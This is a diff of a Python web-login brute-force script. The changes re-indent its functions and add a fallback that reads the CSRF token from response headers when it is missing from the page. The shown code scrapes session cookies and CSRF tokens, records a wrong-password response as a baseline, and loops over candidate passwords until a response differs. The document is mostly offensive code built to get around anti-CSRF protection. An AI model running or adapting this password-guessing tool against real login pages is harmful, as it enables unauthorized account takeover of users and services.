@@ -58,21 +58,24 @@ def get_form():
 
 # Function to basic data such as a Cookie and CSRF token from the website
 def get_data():
-   attack = requests.get(target_url, allow_redirects=False)
-   data = attack.content
-   headers = str(attack.headers["set-cookie"])
-   cookie = re.search('(?:PHPSESSID=)(.*)(?:;)', headers)
-   cookie = cookie.group(1)
+    attack = requests.get(target_url, allow_redirects=False)
+    data = attack.content
+    headers = str(attack.headers["set-cookie"])
+    cookie = re.search('(?:PHPSESSID=)(.*)(?:;)', headers)
+    cookie = cookie.group(1)
 
-   data = str(data)
-   token = re.search(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', data)
-   csrft = token.group(1)
+    data = str(data)
+    token = re.search(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', data)
+    csrft = token.group(1)
+    if not csrft:
+        headers = str(attack.headers[f"{csrf}"])
+        token = re.search(f'(?:{csrf}=)(.*)(?:;)', headers)
+        csrft = token.group(1)
+
+    return [str(csrft), str(cookie)]
 
 
-   return [str(csrft), str(cookie)]
-
-
-# Function that gets the response from a wrong password to compare it know when we have the right password
+# Function that gets the response from a wrong password to compare it with each response - when we have the right password response will different.
 def get_wrong(username):
     forge = get_data()
     data = {
@@ -89,7 +92,6 @@ def get_wrong(username):
     response = requests.post(target_url, data=data, cookies=cookie)
     response = (str(response.content))
     response = re.sub(f'(?:<.* name="{csrf}" .* value=")(.*)(?:" />)', "omri", response)
-
 
     return response
 
@@ -133,7 +135,6 @@ try:
     options = parse()
     target_url = options.target_url
 
-
     csrf = options.csrf
     user = options.username
     passwdf = options.passwd
@@ -162,7 +163,6 @@ try:
             time.sleep(0.1)
             if right == "1":
                 break
-
 
 
 except KeyboardInterrupt:
